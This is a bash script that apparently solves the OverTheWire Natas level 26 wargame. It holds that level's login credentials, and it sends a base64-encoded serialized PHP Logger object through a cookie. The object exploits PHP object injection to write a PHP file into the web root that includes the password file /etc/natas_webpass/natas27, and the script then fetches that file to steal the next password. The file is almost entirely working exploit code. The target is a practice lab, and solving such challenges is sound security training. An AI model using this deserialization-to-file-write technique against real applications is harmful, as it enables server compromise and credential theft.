#!/bin/bash
. ../natas.sh
natas_url="http://natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T@natas26.natas.labs.overthewire.org"
function hack() {
	attack_string=$(generate-attack-string)
	request -s $attack_string 2>/dev/null 1>/dev/null
	password=$(request-to-attack-file)
	echo $(get-natas-url "27" "$password")
}

function request {
	curl \
		-vs \
		--cookie "PHPSESSID=oc1abora817638lrk05h0hta53; drawing=$1" \
		$natas_url
}

function request-to-attack-file() {
	curl -s "$natas_url/img/give.php"
}

function generate-serialized (){
	path_len=$(echo $1 | wc -m)
	path_len=$(($path_len - 1))

	content_len=$(echo $2 | wc -m)
	content_len=$(($content_len - 1))
	
	serialized="O:6:\"Logger\":3:{s:15:\"LoggerlogFile\";s:$path_len:\"$1\";s:15:\"LoggerinitMsg\";s:22:\"#--session started--# \";s:15:\"LoggerexitMsg\";s:$content_len:\"$2\";}"

	echo -n $serialized
}

function generate-attack-string() {
	# I could not convert serialized string which generated by
	# `generate-serialized` to base64 on Linux probably encoding
	# problems. Following string base64 encoded version of serialization
	# of Logger object with `exitMsg = "<? include '/etc/natas_webpass/natas27'; ?>"`
	# and `logFile = "img/give.php"`

	echo -n "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL2dpdmUucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MjI6IiMtLXNlc3Npb24gc3RhcnRlZC0tIwoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo0MzoiPD8gaW5jbHVkZSAnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnOyA/PiI7fQ=="
}